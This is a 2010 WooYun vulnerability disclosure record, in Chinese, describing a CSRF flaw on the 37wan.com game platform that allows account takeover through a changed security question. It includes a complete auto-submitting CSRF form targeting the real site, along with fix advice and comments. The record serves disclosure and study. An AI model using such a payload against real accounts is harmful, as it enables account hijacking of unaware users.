{"id": 23939, "wybug_id": "wooyun-2010-0768", "wybug_title": "37wan.com网页游戏平台CSRF漏洞(可更改用户密码)", "wybug_corp": "37wan", "wybug_author": "blue", "wybug_date": "2010-11-01 16:25", "wybug_open_date": "2010-11-01 22:03", "wybug_type": "设计缺陷/逻辑错误", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "未联系到厂商或者厂商积极忽略", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["认证设计不合理", "漏洞利用", "网页游戏漏洞"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2010-11-01：\t积极联系厂商并且等待厂商认领中，细节不对外公开\t\t\t\t\t\t\t\t\t2010-11-01：\t厂商已经主动忽略漏洞，细节向公众公开  简要描述： 由于没有token或相关验证机制，通过诱使用户点击包含CSRF代码的页面，可达到非法的目的，一定情境下甚至可修改用户密码。以下以修改用户密码为例说明。 详细说明：  1.等待用户登陆后，诱使点击构造的页面（如可以在游戏聊天里构造链接），可CSRF修改用户的密保问题及答案。2.在找回密码功能里输入密保答案即可修改用户的密码。3.然后......~_^   漏洞证明：  CSRF表单代码：\n<form action=\"http://www.37wan.com/users/home.php\" method=\"post\"><input type=\"hidden\" name=\"action\" value=\"updateInfo\" /><input type=\"hidden\" name=\"name\" value=\"pig\" /><input type=\"hidden\" name=\"id_card_number\" value=\"110101198601011615\" /><input type=\"hidden\" name=\"question\" value=\"你是猪吗?\" /><input type=\"hidden\" name=\"answer\" value=\"是\" /></form><script type=\"text/javascript\">document.forms[0].submit();</script>\n   修复方案：  1.更改密码问题及答案时需要输入密码2.增加用户操作的验证注：其它的网页游戏平台也大多存在此类问题~~   版权声明：转载请注明来源 blue@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 未能联系到厂商或者厂商积极拒绝 漏洞Rank：13 (WooYun评价)  ", "replys": "漏洞评价：\n评论\n     2012-06-05 20:26 |    \t\t_Evil \t\t\t( 普通白帽子  |\t\t\t        Rank:418 漏洞数:59        | 万事无他,唯手熟尔。农民也会编程,别指望天...)\t\t \n  学习中    \n     2012-06-20 13:09 |    \t\tpossible \t\t\t( 普通白帽子  |\t\t\t        Rank:373 漏洞数:32        | everything is possible!)\t\t \n  @_Evil 呵呵 大神 足迹暴漏了     \n     2014-08-01 10:21 |    \t\t阿饭 \t\t\t( 路人 |\t\t\t        Rank:8 漏洞数:1        | aaa)\t\t \n  刚测试了下居然还没有修复。。    \n  \n\n\n", "wybug_level_fromcorp": "未能联系到厂商或者厂商积极拒绝", "wybug_rank_fromcorp": 13, "Ranks": null}